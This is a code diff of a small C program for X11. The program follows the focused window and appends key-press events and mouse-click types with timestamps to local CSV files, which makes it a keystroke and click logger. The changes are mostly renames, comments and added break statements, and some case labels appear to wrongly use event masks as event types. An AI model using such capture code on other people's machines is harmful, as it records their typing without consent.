@@ -4,7 +4,7 @@
 #include <stdio.h>
 #include <stdlib.h>
 
-
+// Error handler
 int handlerXorg(Display* display, XErrorEvent* error)
 {
 	return 0;
@@ -12,24 +12,28 @@ int handlerXorg(Display* display, XErrorEvent* error)
 
 int main()
 {
-	Display* d = XOpenDisplay(":0");
-	if (d == NULL)
+	Display* x11_connection = XOpenDisplay(":0");
+	
+	if (x11_connection == NULL)
 	{
 		printf("Failed to create context.\n");
 		return 1;
 	}
-	Window curFocus;
+
+	Window current_focus;
 	char buf[17];
 	KeySym ks;
 	XComposeStatus comp;
 	int revert;
 
-	XGetInputFocus(d, &curFocus, &revert);
-	XSelectInput(d, curFocus, KeyPressMask | KeyReleaseMask | ButtonPressMask | ButtonReleaseMask);
-
-
+	// Files
 	FILE *f = fopen("keys.csv", "a");
 	FILE* fclick = fopen("clicks.csv", "a");
+
+	XGetInputFocus(x11_connection, &current_focus, &revert);
+	XSelectInput(x11_connection, current_focus, KeyPressMask | KeyReleaseMask | ButtonPressMask | ButtonReleaseMask);
+
+	// Open file
 	if (f == NULL)
 	{
 		printf("Error opening file!\n");
@@ -38,13 +42,17 @@ int main()
 	if (fclick == NULL)
 		return 1;
 
+	// Set handler
 	XSetErrorHandler(handlerXorg);
+	
+	// infinite loop
 	while (1)
 	{
 		XEvent ev;
-		XNextEvent(d, &ev);
-		XGetInputFocus(d, &curFocus, &revert);
-		XSelectInput(d, curFocus, KeyPressMask | KeyReleaseMask);
+		XNextEvent(x11_connection, &ev);
+		XGetInputFocus(x11_connection, &current_focus, &revert);
+		XSelectInput(x11_connection, current_focus, KeyPressMask | KeyReleaseMask);
+		// Event handler
 		switch (ev.type)
 		{
 		case KeyPress:
@@ -57,8 +65,10 @@ int main()
 			break;
 		case ButtonReleaseMask:
 			fprintf(fclick, "%d;%d\n", ev.xbutton.type, (int)ev.xbutton.time);
+			break;
 		case ButtonPressMask:
 			fprintf(fclick, "%d;%d\n", ev.xbutton.type, (int)ev.xbutton.time);
+			break;
 		}
 	}
 	fclose(f);
